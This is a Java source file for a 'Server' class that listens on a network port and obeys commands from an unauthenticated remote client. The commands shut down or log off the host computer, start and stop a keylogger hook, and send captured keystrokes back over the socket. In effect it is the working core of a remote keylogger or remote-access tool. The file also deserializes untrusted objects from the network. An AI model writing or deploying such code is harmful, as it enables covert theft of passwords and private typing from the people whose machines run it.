import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

public class Server {
    public ServerSocket serverSocket;
    public Socket clientSocket;
    private DataOutputStream dataOutputStream;
    private DataInputStream dataInputStream;
    private KeyLogger keyLogger;

    Server() {
        try {
            this.serverSocket = new ServerSocket();
            this.clientSocket = new Socket();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void OpenServer(int port) {
        if (!this.serverSocket.isClosed())
            Close();
        try {
            this.serverSocket = new ServerSocket(port);
            this.keyLogger = new KeyLogger(this);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void Close() {
        try {
            this.serverSocket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public String ShowIP() {
        InetAddress ip;
        try {
            ip = InetAddress.getLocalHost();
            return ip.getHostAddress().toString();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        return "";
    }

    public void AcceptConnection() {
        while (true) {
            try {
                if (!IsConnected()) {
                    this.clientSocket = this.serverSocket.accept();
                    this.dataOutputStream = new DataOutputStream(clientSocket.getOutputStream());
                    this.dataInputStream = new DataInputStream(clientSocket.getInputStream());
                    continue;
                }
                String cmdString = ReceiveCommand();
                if (cmdString.equalsIgnoreCase("ShutDown")) {
                    SendCommand("Shutdown");
                    ComputerController.ShutDown();
                } else if (cmdString.equalsIgnoreCase("LogOff")) {
                    SendCommand("Logout");
                    ComputerController.LogOut();
                } else if (cmdString.equalsIgnoreCase("StartHook")) {
                    SendCommand("StartHook");
                    this.keyLogger.StartHooking();
                } else if (cmdString.equalsIgnoreCase("StopHooking")) {
                    SendCommand("StopHook");
                    this.keyLogger.StopHooking();
                } else if (cmdString.equalsIgnoreCase("ViewKey")) {
                    SendData("ViewKey", keyLogger.GetKey());
                } else {
                    SendCommand("None");
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public boolean IsConnected() {
        if (this.clientSocket == null) {
            this.dataInputStream = null;
            this.dataOutputStream = null;
            return false;
        }
        return this.clientSocket.isConnected();
    }

    public String ReceiveCommand() {
        if (!IsConnected()) {
            return "None";
        }
        try {
            String cmd = dataInputStream.readUTF();
            if (cmd != null) {
                System.out.println(cmd);
                return cmd;
            }
        } catch (SocketException e) {
            this.clientSocket = null;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "None";
    }

    public Object ReceiveData() {
        if (!IsConnected())
            return null;
        Object obj;
        try {
            ObjectInputStream objectInputStream = new ObjectInputStream(dataInputStream);
            obj = objectInputStream.readObject();
            return obj;
        } catch (SocketException e) {
            this.clientSocket = null;
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        return null;
    }

    public void SendData(String cmd, Object obj) {
        if (!IsConnected())
            return;
        try {
            dataOutputStream.writeUTF(cmd);
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(dataOutputStream);
            objectOutputStream.writeObject(obj);
            dataOutputStream.flush();
        } catch (SocketException e) {
            this.clientSocket = null;
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void SendCommand(String cmd) {
        if (!IsConnected())
            return;
        try {
            if (dataOutputStream == null)
                return;
            dataOutputStream.writeUTF(cmd);
            dataOutputStream.flush();
        } catch (SocketException e) {
            this.clientSocket = null;
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
